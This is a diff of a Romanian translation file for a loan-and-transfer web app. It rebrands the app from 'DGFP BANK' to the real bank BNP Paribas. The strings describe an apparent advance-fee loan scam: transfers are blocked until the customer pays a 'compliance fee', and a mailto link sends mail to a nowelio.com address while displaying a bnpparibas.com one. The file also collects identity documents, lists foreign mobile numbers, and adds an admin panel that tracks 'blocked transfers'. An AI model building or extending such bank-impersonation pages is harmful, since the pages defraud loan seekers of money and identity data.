@@ -136,7 +136,7 @@
     "viewLoan": "Vizualizați fișierul",
     "needHelp": "Ai nevoie de ajutor?",
     "contactSupport": "Contactați serviciul pentru clienți",
-    "metaTitle": "Tabloul meu de bord — DGFP BANK",
+    "metaTitle": "Tabloul meu de bord — BNP PARIBAS",
     "sessionExpired": "Sesiunea a expirat din cauza inactivității",
     "loadError": "Eroare de încărcare",
     "welcomeNamed": "Bun venit, {{name}}",
@@ -190,7 +190,7 @@
     "success": "Aplicație trimisă!",
     "requiredDocs": "Documente necesare pentru revizuire",
     "requiredDocsHint": "Încărcați fișiere PDF, JPG sau PNG care pot fi citite pentru a accelera aprobarea.",
-    "doc1": "ID valabil (ambele părți)",
+    "doc1": "Act de identitate sau permis de conducere valabil (ambele părți) — sau pașaport (doar față)",
     "doc2": "Dovada recentă a adresei",
     "doc3": "Ultimele trei fișe de plată sau dovada de venit",
     "doc4": "Ultimul extras de cont bancar sau IBAN pe numele solicitantului",
@@ -207,7 +207,11 @@
     "successToast": "Solicitarea dvs. a fost trimisă cu succes",
     "loading": "Încărcare…",
     "docsRequiredExact": "Trebuie să încărcați exact documentele {{count}} pentru a vă trimite cererea.",
-    "uploadHintExact": "Încărcați exact documente {{count}} (PDF, JPG, PNG — 5 MB maxim fiecare)"
+    "uploadHintExact": "Încărcați exact documente {{count}} (PDF, JPG, PNG — 5 MB maxim fiecare)",
+    "address": "Adresa poștală completă",
+    "addressPlaceholder": "Începeți să vă introduceți adresa...",
+    "addressHint": "Selectați o sugestie sau introduceți manual adresa dvs. completă.",
+    "addressRequired": "Vă rugăm să furnizați adresa dvs. poștală completă"
   },
   "transfer": {
     "title": "Faceți un transfer",
@@ -273,8 +277,8 @@
       "appointment": "Cerere de programare",
       "other": "Alte"
     },
-    "metaTitle": "Contact — Serviciu clienți DGFP BANK",
-    "metaDesc": "Contactați serviciul clienți DGFP BANK pentru întrebări despre contul dvs., împrumuturi sau transferuri.",
+    "metaTitle": "Contact — Serviciu clienți BNP PARIBAS",
+    "metaDesc": "Contactați serviciul clienți BNP PARIBAS pentru întrebări despre contul dvs., împrumuturi sau transferuri.",
     "nameRequired": "Numele este obligatoriu",
     "emailInvalid": "E-mail nevalid",
     "messageTooShort": "Mesaj prea scurt (minimum 10 caractere)",
@@ -500,7 +504,7 @@
     "stepNotReached": "Pasul încă nu a fost atins"
   },
   "transfersPage": {
-    "metaTitle": "Transferurile mele — DGFP BANK",
+    "metaTitle": "Transferurile mele — BNP PARIBAS",
     "eyebrow": "Zona de transferuri",
     "title": "Transferurile mele",
     "subtitle": "Urmăriți transferurile SEPA, pașii de conformitate și chitanțele.",
@@ -524,12 +528,12 @@
     }
   },
   "landing": {
-    "metaTitle": "DGFP BANK — Împrumuturi online instantanee",
+    "metaTitle": "BNP PARIBAS — Împrumuturi online instantanee",
     "metaDesc": "Finanțați-vă proiectele cu încredere. Împrumuturi rapide personale de la 1.000 € la 50.000 €. Decizie în 24h, fonduri în 72h.",
     "badge": "Decizie în mai puțin de 24 de ore",
     "heroTitleA": "Finanțați-vă proiectele",
     "heroTitleB": "cu incredere.",
-    "heroDesc": "DGFP BANK face parte din generația lider de bănci europene care oferă împrumuturi personale rapide, transparente și sigure.",
+    "heroDesc": "BNP PARIBAS face parte din generația lider de bănci europene care oferă împrumuturi personale rapide, transparente și sigure.",
     "ctaPrimary": "Aplicați pentru un împrumut",
     "ctaSecondary": "Am deja un cont",
     "trust1": "Date criptate",
@@ -558,7 +562,7 @@
       "s3t": "Semnează-ți contractul",
       "s3d": "Odată aprobat de echipa noastră, semnați-vă contractul electronic și în siguranță.",
       "s4t": "Primește-ți fondurile",
-      "s4d": "Odată ce perioada legală a trecut, fondurile sunt disponibile în portofelul tău DGFP BANK, gata pentru a fi retrase."
+      "s4d": "Odată ce perioada legală a trecut, fondurile sunt disponibile în portofelul tău BNP PARIBAS, gata pentru a fi retrase."
     },
     "partners": {
       "eyebrow": "Băncile noastre partenere",
@@ -651,9 +655,9 @@
     "blockedTitle": "Este necesară verificarea conformității",
     "blockedDesc": "Pentru a finaliza acest pas, vă rugăm să plătiți taxa de conformitate de mai jos și să introduceți codul primit.",
     "configTitle": "Configurare în curs",
-    "configDesc": "Un consilier DGFP BANK pregătește plata conformității. Veți primi instrucțiuni în scurt timp.",
+    "configDesc": "Un consilier BNP PARIBAS pregătește plata conformității. Veți primi instrucțiuni în scurt timp.",
     "fee": "Taxa de conformitate datorată",
-    "bankOrder": "Detalii DGFP BANK",
+    "bankOrder": "Detalii BNP PARIBAS",
     "accountHolder": "Titularul de cont",
     "reason": "Motivul transferului",
     "receiptLabel": "Dovada de plata",
@@ -683,9 +687,9 @@
     "subtitle": "Urmăriți progresul și validați în siguranță fiecare etapă."
   },
   "transferDetail": {
-    "metaTitle": "Detalii transfer — DGFP BANK",
+    "metaTitle": "Detalii transfer — BNP PARIBAS",
     "backAll": "Toate transferurile",
-    "header": "DGFP BANK · Ordin de transfer",
+    "header": "BNP PARIBAS · Ordin de transfer",
     "amount": "Cantitate",
     "beneficiary": "Beneficiar",
     "bank": "Bank",
@@ -704,7 +708,7 @@
     },
     "rejected": {
       "title": "Acest transfer a fost respins",
-      "desc": "Fondurile au fost creditate automat înapoi în contul dumneavoastră DGFP BANK.",
+      "desc": "Fondurile au fost creditate automat înapoi în contul dumneavoastră BNP PARIBAS.",
       "reason": "Motiv"
     },
     "timeline": {
@@ -722,12 +726,12 @@
     },
     "receipt": {
       "title": "chitanta bancara disponibila",
-      "desc": "Descărcați rezumatul oficial DGFP BANK al acestui ordin de transfer.",
+      "desc": "Descărcați rezumatul oficial BNP PARIBAS al acestui ordin de transfer.",
       "download": "Descărcați chitanța"
     }
   },
   "receipt": {
-    "metaTitle": "Chitanța de transfer — DGFP BANK",
+    "metaTitle": "Chitanța de transfer — BNP PARIBAS",
     "download": "Descărcați PDF",
     "subBrand": "Împreună prosperăm",
     "documentLabel": "Document oficial",
@@ -743,7 +747,7 @@
     "bic": "BIC / SWIFT",
     "reference": "Referinţă",
     "issuedAt": "Data emiterii",
-    "footerSecurity": "Document generat de sistemele securizate DGFP BANK.",
+    "footerSecurity": "Document generat de sistemele securizate BNP PARIBAS.",
     "footerLegal": "Această chitanță atestă operațiunea bancară și poate fi prezentată oricărei autorități competente.",
     "generating": "Se generează PDF...",
     "downloaded": "Chitanța a fost descărcată cu succes",
@@ -766,7 +770,7 @@
     "serverBic": "BIC / SWIFT",
     "serverReference": "Referinţă",
     "serverExecutedAt": "Data executiei",
-    "serverSecurity": "Document generat de sistemele securizate DGFP BANK.",
+    "serverSecurity": "Document generat de sistemele securizate BNP PARIBAS.",
     "serverLegal": "Această chitanță este dovada operațiunii bancare și poate fi prezentată oricărei autorități competente."
   },
   "notif": {
@@ -808,7 +812,7 @@
     }
   },
   "settings": {
-    "metaTitle": "Setări — DGFP BANK",
+    "metaTitle": "Setări — BNP PARIBAS",
     "title": "Setări",
     "subtitleDesktop": "Gestionați-vă informațiile personale și securitatea",
     "subtitleMobile": "Gestionați-vă contul și securitatea",
@@ -844,7 +848,7 @@
     "languageSaved": "Limba a fost actualizată"
   },
   "loanDetail": {
-    "metaTitle": "Detalii credit — DGFP BANK",
+    "metaTitle": "Detalii credit — BNP PARIBAS",
     "downloadImpossible": "Descărcarea indisponibilă",
     "contractGenerating": "Se generează contract PDF...",
     "sessionExpired": "Sesiunea a expirat. Vă rugăm să vă conectați din nou.",
@@ -910,10 +914,11 @@
     "home": "Acasă",
     "transfers": "Transferuri",
     "request": "Cerere",
-    "primary": "Navigație principală"
+    "primary": "Navigație principală",
+    "support": "Suport"
   },
   "mobileHome": {
-    "title": "Bine ați venit la DGFP BANK",
+    "title": "Bine ați venit la BNP PARIBAS",
     "subtitle": "Banca ta, în buzunar.",
     "description": "Gestionați-vă împrumuturile, transferurile și conturile în siguranță, oriunde v-ați afla.",
     "cta": "Începeți",
@@ -927,7 +932,7 @@
     "description": "Am trimis un link de confirmare la adresa ta de e-mail.",
     "instruction": "Faceți clic pe linkul din căsuța de e-mail pentru a vă activa contul.",
     "loading": "Astept confirmarea...",
-    "footer": "Pentru securitatea dvs., nu vă împărtășiți niciodată acreditările. DGFP BANK nu vă va cere niciodată parola."
+    "footer": "Pentru securitatea dvs., nu vă împărtășiți niciodată acreditările. BNP PARIBAS nu vă va cere niciodată parola."
   },
   "password": {
     "show": "Afișați parola",
@@ -948,7 +953,7 @@
   "livechat": {
     "open": "Deschide chatul",
     "close": "Aproape",
-    "title": "Consilier DGFP BANK",
+    "title": "Consilier BNP PARIBAS",
     "online": "Online",
     "placeholder": "Scrie-ți mesajul...",
     "greeting": "Salut 👋! Cum te pot ajuta azi?",
@@ -956,9 +961,9 @@
       "loan": "Pentru a solicita un împrumut, accesați „Împrumut nou” din tabloul de bord. Decizie în 24h, fonduri în 72h.",
       "password": "Vă puteți reseta parola din pagina de conectare folosind „Ați uitat parola?”.",
       "transfer": "Transferurile dvs. sunt listate în secțiunea „Transferuri” din tabloul de bord.",
-      "contact": "Echipa noastră este contactată la +44 7537 103065 sau prin pagina Contact.",
+      "contact": "Echipa noastră este contactată la +39 350 036 6867 sau prin pagina Contact.",
       "thanks": "Cu plăcere! Simțiți-vă liber să întrebați orice altceva.",
-      "default": "Un consilier DGFP BANK vă va contacta în curând. Ne puteți contacta și prin intermediul paginii de contact."
+      "default": "Un consilier BNP PARIBAS vă va contacta în curând. Ne puteți contacta și prin intermediul paginii de contact."
     }
   },
   "legal": {
@@ -1001,7 +1006,7 @@
     },
     "terms": {
       "title": "Termenii serviciului",
-      "subtitle": "Folosind DGFP BANK acceptați termenii.",
+      "subtitle": "Folosind BNP PARIBAS acceptați termenii.",
       "sections": [
         {
           "h": "1. Eligibilitate",
@@ -1056,11 +1061,11 @@
       "sections": [
         {
           "h": "Editor",
-          "p": "DGFP BANK — SAS cu capital de 1.000.000 EUR — sediu: 1 Centenary Square, Birmingham, Regatul Unit."
+          "p": "BNP PARIBAS — SAS cu capital de 1.000.000 EUR — sediu: 1 Centenary Square, Birmingham, Regatul Unit."
         },
         {
           "h": "Director publicare",
-          "p": "Compliance DGFP BANK."
+          "p": "Compliance BNP PARIBAS."
         },
         {
           "h": "Hosting",
@@ -1068,11 +1073,11 @@
         },
         {
           "h": "Contact",
-          "p": "<a href=\"mailto:support@dgfp.zenvoriax.com\">support@dgfp.com</a>"
+          "p": "<a href=\"mailto:support_bnpparibas@nowelio.com\">support@bnpparibas.com</a>"
         },
         {
           "h": "Proprietate intelectuală",
-          "p": "Mărcile și conținutul aparțin DGFP BANK."
+          "p": "Mărcile și conținutul aparțin BNP PARIBAS."
         }
       ]
     },
@@ -1262,5 +1267,116 @@
     "aml": "AML / KYC",
     "finPriv": "Confidențialitate financiară",
     "contact": "Contact"
+  },
+  "chat": {
+    "loading": "Se încarcă",
+    "notFound": "Pagină negăsită",
+    "notFoundDesc": "Această pagină nu există.",
+    "backHome": "Înapoi la început",
+    "assistant": "asistentă",
+    "typing": "scrie",
+    "today": "Astăzi",
+    "yesterday": "Ieri",
+    "pageTitle": "Suport live",
+    "pageDesc": "Discutați cu echipa noastră sau cu Anna, asistenta virtuală.",
+    "closed": "Conversație închisă",
+    "closeTicket": "Închide conversația",
+    "close": "Închide",
+    "compose": {
+      "placeholder": "Scrieți mesajul…"
+    },
+    "rt": {
+      "bold": "Aldin",
+      "italic": "Cursiv",
+      "link": "Link",
+      "linkPrompt": "Introduceți URL (https://...)"
+    },
+    "handoff": {
+      "question": "Doriți să vorbiți cu un consilier?",
+      "yes": "Da, vorbește cu un consilier",
+      "no": "Nu, mulțumesc",
+      "pending": "Cererea dvs. este în procesare, un consilier vi se alătură în 1-2 minute…"
+    },
+    "agent": {
+      "joined": "s-a alăturat conversației",
+      "joinedYou": "V-ați alăturat conversației",
+      "notAssigned": "Niciun agent atribuit",
+      "join": "Alăturați-vă"
+    },
+    "status": {
+      "online": "Online",
+      "agent": "Consilier online",
+      "open": "Deschis",
+      "waiting_agent": "Așteaptă agent",
+      "assigned": "În curs",
+      "closed": "Închis"
+    },
+    "admin": {
+      "empty": "Nicio conversație.",
+      "selectHint": "Selectați o conversație în stânga.",
+      "folders": "Fișierele clienților",
+      "tickets": "bilete",
+      "searchPlaceholder": "Căutați un client, bilet, e-mail...",
+      "filter": {
+        "all": "Toate",
+        "waiting": "În așteptare",
+        "mine": "Mi-a fost atribuit",
+        "closed": "Închis",
+        "guests": "Vizitatori"
+      }
+    },
+    "banner": {
+      "top": "BNP PARIBAS — Serviciu clienți securizat",
+      "bottom": "© 2000-{{year}} BNP Paribas SA · 16 boulevard des Italiens, 75009 Paris"
+    },
+    "loginRequired": {
+      "title": "Autentificați-vă pentru chat",
+      "desc": "Trebuie să fiți autentificat pentru suport.",
+      "cta": "Autentificare"
+    },
+    "nav": "Suport",
+    "guest": {
+      "subtitle": "Asistență pentru vizitatori",
+      "intro": "Completați acest formular, un consilier BNP PARIBAS vă va răspunde rapid. Veți primi un număr de bilet.",
+      "name": "Numele complet *",
+      "email": "Email *",
+      "phone": "Telefon",
+      "whatsapp": "WhatsApp",
+      "country": "Țara de reședință",
+      "subject": "Subiect",
+      "message": "Mesajul dvs *",
+      "submit": "Deschide-mi biletul",
+      "privacy": "Datele dumneavoastră sunt tratate confidențial (GDPR).",
+      "created": "Biletul #{{ticket}} creat!",
+      "errors": {
+        "required": "Sunt necesare nume, e-mail și mesaj.",
+        "fail": "Trimiterea a eșuat, încercați din nou."
+      }
+    },
+    "ticket": "Bilet",
+    "archived": "Arhive",
+    "open": "Deschide"
+  },
+  "adminDash": {
+    "title": "Tabloul de bord — BNP PARIBAS",
+    "overview": "Prezentare generală",
+    "clients": "Clienții",
+    "loans": "Împrumuturi",
+    "transfers": "Transferuri",
+    "chat": "Chat live",
+    "security": "Securitate",
+    "notifications": "Notificări",
+    "kpis": {
+      "clients": "Clienți activi",
+      "loansPending": "Împrumuturi în așteptare",
+      "transfersBlocked": "Transferuri blocate",
+      "ticketsOpen": "Deschideți bilete",
+      "newToday": "Nou azi"
+    },
+    "recentActivity": "Activitate recentă",
+    "quickActions": "Acțiuni rapide",
+    "staff": "Team & roles",
+    "roles": "Permissions",
+    "logs": "Activity log"
   }
 }
